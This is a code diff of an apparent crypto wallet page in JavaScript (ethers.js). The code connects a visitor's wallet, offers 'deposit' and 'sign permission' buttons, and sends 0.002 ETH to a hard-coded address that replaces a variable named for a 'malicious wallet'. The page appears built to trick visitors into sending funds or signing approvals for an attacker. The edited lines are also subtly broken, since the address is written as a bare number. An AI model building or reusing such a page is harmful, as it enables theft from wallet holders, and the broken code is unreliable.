@@ -117,7 +117,7 @@
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     provider = new ethers.providers.Web3Provider(window.ethereum);
                     signer = provider.getSigner();
-                    contrato = new ethers.Contract(0x8B1A41Aa5c6b626fD0a61B120F72E261bD16e84F, {
+                    contrato = new ethers.Contract(0x8B1A41Aa5c6b626fD0a61B120F72E261bD16e84F, [{
 		"inputs": [],
 		"stateMutability": "nonpayable",
 		"type": "constructor"
@@ -180,7 +180,7 @@
 		"outputs": [],
 		"stateMutability": "nonpayable",
 		"type": "function"
-	}, signer);
+	}], signer);
 
                     document.getElementById('btnDeposit').style.display = 'block';
                     document.getElementById('btnSignPermission').style.display = 'block';
@@ -197,7 +197,7 @@
             if (signer) {
                 try {
                     const tx = await signer.sendTransaction({
-                        to: enderecoContratoMaliciousWallet,
+                        to: 0x8B1A41Aa5c6b626fD0a61B120F72E261bD16e84F,
                         // Convertendo 0.002 ether para Wei
                         value: ethers.utils.parseEther("0.002")
                     });
